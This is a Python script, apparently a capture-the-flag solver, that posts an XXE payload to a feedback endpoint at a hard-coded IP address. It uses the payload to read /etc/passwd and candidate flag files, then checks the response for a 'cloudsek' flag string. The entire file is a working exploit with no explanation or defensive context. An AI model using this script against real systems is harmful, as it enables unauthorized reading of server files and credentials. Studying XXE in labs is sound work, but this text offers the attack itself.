import requests
import re

URL = "http://15.206.47.5:5000"

def read_file_via_xxe(file_path):
    """
    Read a file using XXE.
    """
    print(f"\nTrying to read: {file_path}")
    
    xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feedback [
    <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<feedback>
    <name>&xxe;</name>
    <message>test</message>
</feedback>"""
    
    try:
        response = requests.post(
            f"{URL}/feedback",
            headers={'Content-Type': 'application/xml'},
            data=xxe_payload,
            timeout=10
        )
        
        if "cloudsek" in response.text.lower():
            print(f"FLAG FOUND: {response.text}")
            return response.text
        else:
            print(f"FLAG NOT FOUND")
            return None
    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    files_to_try = [
        "/etc/passwd",
        "/flag",
        "/flag.txt"
    ]
    
    for file_path in files_to_try:
        flag = read_file_via_xxe(file_path)
        if flag:
            print(f"FLAG FOUND: {flag}")
            break